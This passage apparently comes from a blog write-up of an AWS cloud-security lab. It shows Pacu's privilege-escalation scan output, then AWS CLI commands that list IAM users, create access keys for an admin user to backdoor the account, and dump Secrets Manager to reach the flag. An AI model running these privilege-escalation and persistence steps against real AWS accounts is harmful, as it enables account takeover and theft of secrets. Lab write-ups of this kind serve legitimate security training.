+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span>   POTENTIAL: AddUserToGroup
+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span>   POTENTIAL: AttachGroupPolicy
+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span>   POTENTIAL: AttachRolePolicy
+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span>   POTENTIAL: AttachUserPolicy
+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span>   POTENTIAL: CodeStarCreateProjectFromTemplate
+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span>   POTENTIAL: CodeStarCreateProjectThenAssociateTeamMember
+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span>   <span class=s1>&#39;CONFIRMED: CreateAccessKey&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span>   POTENTIAL: CreateEC2WithExistingIP
+</span></span></code></pre></div><blockquote><p>CONFIRMED! Our user can indeed create access keys</p></blockquote><p><strong>Lets check what users exist on the account</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws iam list-users --profile env_key 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Users&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Path&#34;</span>: <span class=s2>&#34;/&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;UserName&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl_admin_user&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;UserId&#34;</span>: <span class=s2>&#34;AIDAUGVOUJQIHFF3KCAV5&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_admin_user&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;CreateDate&#34;</span>: <span class=s2>&#34;2025-08-21T06:54:26+00:00&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        ---&lt;snip&gt;--
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>-There is an admin user!</p></blockquote><p>We can create keys for the admin user and backdoor that accont!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws iam create-access-key --user-name cgid9oc3krm0fl_admin_user --profile env_key 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;AccessKey&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;UserName&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl_admin_user&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;AccessKeyId&#34;</span>: <span class=s2>&#34;AKIA[REDACTED-ADMIN]&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;Status&#34;</span>: <span class=s2>&#34;Active&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;SecretAccessKey&#34;</span>: <span class=s2>&#34;[REDACTED-ADMIN]&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;CreateDate&#34;</span>: <span class=s2>&#34;2025-08-21T11:58:24+00:00&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>Perfect, let create a new admin profile with the new keys</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws configure --profile beanstalk_admin
+</span></span><span class=line><span class=cl>AWS Access Key ID <span class=o>[</span>None<span class=o>]</span>: AKIA<span class=o>[</span>REDACTED-ADMIN<span class=o>]</span>
+</span></span><span class=line><span class=cl>AWS Secret Access Key <span class=o>[</span>None<span class=o>]</span>: <span class=o>[</span>REDACTED-ADMIN<span class=o>]</span>
+</span></span><span class=line><span class=cl>Default region name <span class=o>[</span>None<span class=o>]</span>: us-east-1
+</span></span><span class=line><span class=cl>Default output format <span class=o>[</span>None<span class=o>]</span>: json
+</span></span></code></pre></div><p>Lets get the flag by dumping the <strong>secrets manager</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws secretsmanager list-secrets --profile beanstalk_admin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;SecretList&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;ARN&#34;</span>: <span class=s2>&#34;arn:aws:secretsmanager:us-east-1:289202785296:secret:cgid9oc3krm0fl_final_flag-V5tMVD&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Name&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl_final_flag&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;LastChangedDate&#34;</span>: <span class=s2>&#34;2025-08-21T01:54:27.561000-05:00&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;LastAccessedDate&#34;</span>: <span class=s2>&#34;2025-08-20T19:00:00-05:00&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Tags&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>                <span class=o>{</span>
+</span></span><span class=line><span class=cl>        ---&lt;snip&gt;---
+</span></span></code></pre></div></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
+<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>
